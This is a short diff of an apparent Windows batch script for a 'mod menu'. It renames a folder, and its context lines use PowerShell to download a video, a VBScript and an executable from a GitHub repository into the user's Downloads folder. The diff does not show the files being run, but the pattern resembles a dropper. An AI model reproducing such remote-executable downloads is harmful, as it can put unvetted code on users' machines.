@@ -1,4 +1,4 @@
-md UI_Generator
+md UI-Generator
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/vid.mp4 -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\vid.mp4"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/msgbox.vbs -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\msgbox.vbs"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/msg.exe -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\msg.exe"
